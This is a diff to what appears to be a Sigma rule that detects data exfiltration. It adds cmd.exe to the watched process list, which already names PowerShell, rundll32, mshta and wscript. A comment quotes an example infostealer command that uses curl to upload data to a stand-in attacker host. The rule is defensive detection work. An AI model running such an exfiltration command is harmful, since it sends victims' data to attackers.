@@ -12,7 +12,7 @@ references:
   - https://attack.mitre.org/techniques/T1041/
 author: Adama ASSIONGBON (SOC & CTI Consultant), https://linkedin.com/in/adama-assiongbon-9029893a
 date: 2026-01-06
-modified: 2026-06-19
+modified: 2026-06-22
 related:
   - id: 26090645-90c0-40ee-9aa9-5d0037b33ae7
     type: similar
@@ -34,6 +34,9 @@ detection:
     Image|endswith:
       - '\powershell.exe'
       - '\pwsh.exe'
+      # BLIND SPOT FIX 2026-06-22 (second pass): cmd.exe was absent. An infostealer using
+      # `cmd.exe /c curl https://attacker.com/upload` for exfiltration would evade this rule.
+      - '\cmd.exe'
       - '\rundll32.exe'
       - '\mshta.exe'
       - '\wscript.exe'
